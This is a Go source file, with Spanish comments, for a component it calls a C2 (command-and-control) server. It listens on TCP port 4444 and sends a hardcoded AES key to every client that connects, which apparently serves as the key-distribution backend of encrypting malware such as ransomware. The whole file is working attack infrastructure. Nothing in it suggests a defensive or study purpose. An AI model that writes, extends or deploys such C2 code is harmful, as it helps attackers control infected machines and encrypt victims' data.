// c2_server.go
package main

import (
	"fmt"
	"log"
	"net"
)

const (
	listenAddr = ":4444" // Puerto de escucha
	aesKey     = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff" //Clave AES
)

func main() {
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("Error escuchando: %v", err)
	}
	defer listener.Close()

	fmt.Printf("C2 escuchando en %s. Esperando conexiones...\n", listenAddr)
	fmt.Printf("Clave que se enviará (%d chars): %s\n", len(aesKey), aesKey)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Error aceptando conexión: %v", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Enviar la clave de 64 caracteres
	_, err := conn.Write([]byte(aesKey))
	if err != nil {
		log.Printf("Error enviando clave: %v", err)
		return
	}

	fmt.Printf("Clave enviada a %s\n", conn.RemoteAddr())
}
